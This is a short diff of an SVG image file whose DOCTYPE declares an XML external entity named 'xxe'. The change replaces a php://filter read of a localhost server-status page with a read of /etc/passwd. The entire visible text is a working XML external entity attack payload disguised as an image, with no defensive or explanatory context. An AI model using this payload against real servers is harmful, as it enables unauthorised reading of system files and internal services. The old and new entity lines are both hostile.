@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/server-status">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <svg width="1200" height="800" xmlns="http://www.w3.org/2000/svg">
   <style>
